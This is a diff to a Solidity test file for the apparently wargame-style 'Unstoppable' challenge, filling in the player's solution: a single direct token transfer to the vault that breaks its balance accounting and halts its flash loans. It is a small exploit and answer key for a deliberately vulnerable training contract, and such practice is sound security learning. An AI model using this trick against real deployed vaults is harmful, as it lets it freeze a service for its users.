@@ -92,7 +92,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        //send 1 token to trigger bad rounding down
+        token.transfer(address(vault), 1 ether);
     }
 
     /**
